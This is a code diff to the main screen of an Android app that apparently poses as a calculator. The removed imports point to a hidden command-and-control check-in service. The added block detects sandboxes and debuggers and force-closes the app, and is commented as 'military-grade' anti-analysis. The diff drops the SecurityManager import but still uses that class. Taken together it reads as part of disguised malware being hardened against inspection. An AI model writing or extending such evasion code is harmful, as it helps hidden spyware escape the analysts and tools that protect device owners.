@@ -15,10 +15,7 @@ import okhttp3.Callback
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.Response
-import org.kalkulator.api.C2Service
-import org.kalkulator.model.CheckinRequest
-import org.kalkulator.model.CheckinResponse
-import org.kalkulator.utils.SecurityManager
+import org.kalkulator.security.NativeSecurity
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 import java.io.File
@@ -29,10 +26,18 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tvDisplay: TextView
     private var currentInput = ""
     private lateinit var securityManager: SecurityManager
+    private lateinit var nativeSecurity: NativeSecurity
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         securityManager = SecurityManager(this)
+        nativeSecurity = NativeSecurity()
+
+        // [MILITARY-GRADE] Anti-Analysis & Environment Check
+        if (!nativeSecurity.verifyEnvironment() || !nativeSecurity.checkDebugging()) {
+            finishAffinity() // Force Close if running in Sandbox or Debugger detected
+            return
+        }
         
         if (securityManager.isFirstRun()) {
             startActivity(Intent(this, SetupActivity::class.java))
